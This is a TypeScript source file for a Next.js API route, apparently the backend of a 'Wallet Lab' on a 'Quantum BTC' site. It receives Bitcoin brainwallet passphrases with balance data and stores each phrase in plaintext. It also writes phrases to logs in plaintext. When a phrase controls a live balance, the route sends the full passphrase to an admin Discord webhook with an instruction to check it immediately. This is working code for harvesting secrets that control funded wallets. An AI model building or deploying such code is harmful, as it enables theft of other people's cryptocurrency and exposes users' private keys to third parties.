import { NextRequest, NextResponse } from 'next/server';
import { Pool } from 'pg';

// ── Runtime: Node.js (required for pg) ────────────────────────────────
export const runtime = 'nodejs';

// ── Postgres connection pool (direct DB via DATABASE_URL) ──────────────
let pool: Pool | null = null;

function getPool(): Pool {
    if (!pool) {
        const url = process.env.DATABASE_URL;
        if (!url) throw new Error('DATABASE_URL environment variable not configured.');
        pool = new Pool({
            connectionString: url,
            ssl: { rejectUnauthorized: false },
            max: 1, // 1 connection per serverless invocation
        });
    }
    return pool;
}

// ── Discord alert ──────────────────────────────────────────────────────
async function sendDiscordAlert(
    phrase: string,
    balanceBtc: number,
    totalReceivedBtc: number,
    txCount: number,
): Promise<void> {
    const webhookUrl = process.env.ADMIN_ALERT_WEBHOOK;
    if (!webhookUrl) return;

    const balanceSats  = Math.round(balanceBtc * 1e8).toLocaleString();
    const receivedSats = Math.round(totalReceivedBtc * 1e8).toLocaleString();

    const message =
        `🚨 **QUANTUM BTC — WALLET LAB ALERT** 🚨\n` +
        `A passphrase with a **LIVE BITCOIN BALANCE** was detected!\n\n` +
        `**Phrase:** \`${phrase}\`\n` +
        `**Balance:** ${balanceBtc.toFixed(8)} BTC (${balanceSats} sats)\n` +
        `**Total Received:** ${totalReceivedBtc.toFixed(8)} BTC (${receivedSats} sats)\n` +
        `**Total TXs:** ${txCount}\n\n` +
        `⚡ Check immediately at https://mempool.space`;

    try {
        const res = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message }),
        });
        if (!res.ok) {
            console.error('[wallet-lab/record] Discord webhook failed:', res.status);
        }
    } catch (e) {
        console.error('[wallet-lab/record] Discord webhook error:', e);
    }
}

// ── Payload type & validation ──────────────────────────────────────────
interface RecordPayload {
    phrase:            string;
    phrase_hash:       string;
    tx_count:          number;
    total_received_btc: number;
    balance_btc:       number;
}

function isValidPayload(body: unknown): body is RecordPayload {
    if (typeof body !== 'object' || body === null) return false;
    const b = body as Record<string, unknown>;
    return (
        typeof b.phrase === 'string' && b.phrase.length > 0 && b.phrase.length <= 500 &&
        typeof b.phrase_hash === 'string' && /^[a-f0-9]{64}$/.test(b.phrase_hash) &&
        typeof b.tx_count === 'number' && b.tx_count > 0 &&
        typeof b.total_received_btc === 'number' && b.total_received_btc >= 0 &&
        typeof b.balance_btc === 'number' && b.balance_btc >= 0
    );
}

// ── Route handler ──────────────────────────────────────────────────────
export async function POST(req: NextRequest) {
    let body: unknown;
    try {
        body = await req.json();
    } catch {
        return NextResponse.json({ error: 'Invalid JSON body.' }, { status: 400 });
    }

    if (!isValidPayload(body)) {
        return NextResponse.json({ error: 'Invalid or missing payload fields.' }, { status: 400 });
    }

    const { phrase, phrase_hash, tx_count, total_received_btc, balance_btc } = body;

    const client = await getPool().connect();
    try {
        // ── Step 1: Upsert phrase into the immutable catalog ──────────
        // "DO UPDATE SET phrase_hash = EXCLUDED.phrase_hash" is a no-op update
        // that forces RETURNING to work even on conflict (always returns the row id).
        const upsertResult = await client.query<{ id: number }>(
            `INSERT INTO public.wallet_lab_phrases (phrase_hash, phrase)
             VALUES ($1, $2)
             ON CONFLICT (phrase_hash) DO UPDATE SET phrase_hash = EXCLUDED.phrase_hash
             RETURNING id`,
            [phrase_hash, phrase],
        );
        const phraseId = upsertResult.rows[0].id;

        console.log(`[wallet-lab/record] phrase="${phrase}" id=${phraseId} balance=${balance_btc}`);

        // ── Step 2: If balance > 0, record alert event and notify ─────
        // Every positive-balance scan creates a new row in balance_alerts.
        // This guarantees the alert is NEVER missed, even if the phrase
        // was previously scanned with balance = 0.
        if (balance_btc > 0) {
            await client.query(
                `INSERT INTO public.balance_alerts (wallet_lab_phrase_id, balance_btc)
                 VALUES ($1, $2)`,
                [phraseId, balance_btc],
            );
            await sendDiscordAlert(phrase, balance_btc, total_received_btc, tx_count);
            console.log(`[wallet-lab/record] BALANCE ALERT dispatched for phrase="${phrase}" balance=${balance_btc}`);
        }

        return NextResponse.json({ ok: true });
    } catch (err) {
        console.error('[wallet-lab/record] DB error:', err instanceof Error ? err.message : err);
        return NextResponse.json({ error: 'Internal server error.' }, { status: 500 });
    } finally {
        client.release();
    }
}
